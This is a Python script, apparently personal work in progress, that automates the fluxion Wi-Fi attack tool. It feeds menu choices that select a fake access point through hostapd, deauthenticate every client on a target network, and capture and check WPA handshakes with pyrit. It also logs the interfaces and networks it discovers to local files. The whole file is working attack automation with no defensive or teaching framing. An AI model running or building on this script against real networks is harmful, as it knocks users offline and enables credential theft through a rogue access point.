from subprocess import Popen, PIPE
import os
import sys
import re


path = os.path.dirname("/home/trickster/dev/playground/flux/fluxion/")
os.chdir(path)

fr = open("/home/trickster/dev/pptd/output.txt", "r")
fi = open("/home/trickster/dev/pptd/interfaces.txt", "w+")
fn = open("/home/trickster/dev/pptd/networks.txt", "w+")
p = Popen("./fluxion.sh", stdin=PIPE, stdout=PIPE, encoding="utf8")

interface = False
network = False

ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')

for text in p.stdout:
    line = ansi_escape.sub('', text)
    sys.stdout.write(text)

    if "pptd_interface_start" in line:
        interface = True

    if "pptd_network_start" in line:
        network = True

    if interface:
        if not line.startswith("pptd_interface"):
            fi.write(text)
            fi.flush()

    if network:
        if not line.startswith("pptd_network"):
            fn.write(text)
            fn.flush()

    # Select language
    if "pptd_language" in line:
        p.stdin.write('1\n')  # [1] English
        p.stdin.flush()

    # Select interface
    if "pptd_interface_end" in line:
        # TODO: send interface list to frontend
        # TODO: get user input from frontend
        # TODO: validate user input
        # TODO: forward validated input to subprocess
        interface = False
        p.stdin.write('2\n')
        p.stdin.flush()

    # Select channel
    if "pptd_channel" in line:
        p.stdin.write('1\n')  # [1] All channels
        p.stdin.flush()

    # Select network
    if "pptd_network_end" in line:
        # TODO: send networks list to frontend
        # TODO: get user input from frontend
        # TODO: validate user input
        # TODO: forward validated input to subprocess
        network = False
        p.stdin.write('1\n')
        p.stdin.flush()

    # Select attack option
    if "pptd_attack_option" in line:
        p.stdin.write('1\n')  # [1] FakeAP - Hostapd
        p.stdin.flush()

    # Always check for new handshake
    if "pptd_handshake_skip" in line:
        p.stdin.write('\n')  # Press Enter to skip selecting an existing handshake
        p.stdin.flush()

    # Handshake check
    if "pptd_handshake_check" in line:
        p.stdin.write('1\n')  # [1] pyrit
        p.stdin.flush()

    # De-authentication
    if "pptd_deauth" in line:
        p.stdin.write('1\n')  # [1] Deauth all
        p.stdin.flush()

    # Handshake status
    if "pptd_status" in line:
        p.stdin.write('1\n')  # [1] Check handshake
        p.stdin.flush()
